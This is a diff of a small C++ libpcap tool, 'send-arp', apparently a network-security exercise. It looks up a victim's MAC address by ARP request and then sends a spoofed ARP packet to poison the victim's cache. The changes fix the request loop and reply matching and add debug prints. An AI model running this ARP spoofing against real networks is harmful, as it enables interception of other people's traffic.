@@ -27,7 +27,7 @@ void usage() {
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-Mac send_arp(const char* vicIp){
+Mac send_arp(string vicIp){
 	printf("sent arp request\n");
 	EthArpPacket packet; //arp request packet
 
@@ -52,10 +52,11 @@ Mac send_arp(const char* vicIp){
 
 
     int timeout_ms = 1000; // Set a reasonable timeout (1 second)
-    int sent = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	
 	while (true){
 		printf("while..\n");
+   		int sent = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));                                               
+
 		const u_char* cap_packet;
 		struct pcap_pkthdr* header;
 		
@@ -78,9 +79,11 @@ Mac send_arp(const char* vicIp){
 
 		//Check reply packet
 		if(arp_hdr->op()!=ArpHdr::Reply) continue;
-	
+		printf("hello!!""");	
 		//Check correct sender
-		if(arp_hdr->sip()!=htonl(Ip(vicIp))) continue;
+
+		string s_sip = static_cast<std::string>(arp_hdr->sip());
+		if(s_sip.compare(vicIp)!=0) continue;
 		return arp_hdr->smac();
 	
 	}
@@ -94,7 +97,7 @@ int main(int argc,	char* argv[]) {
 	}
 
 	char* interf = argv[1]; //interface
-	char* vicIp = argv[2]; //sender ip
+	string vicIp = argv[2]; //sender ip
 	char* gateIp = argv[3]; //target ip
 
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -112,6 +115,8 @@ int main(int argc,	char* argv[]) {
 	myMac = get_mac(interface); 
 
 	Mac vicMac = send_arp(vicIp);
+	
+	cout<< static_cast<std::string>(vicMac);
 
 	packet.eth_.smac_ = Mac(myMac);
 	packet.eth_.dmac_ = vicMac;
@@ -142,6 +147,7 @@ int main(int argc,	char* argv[]) {
 	*/
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	printf("sent arp spoofing\n");
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
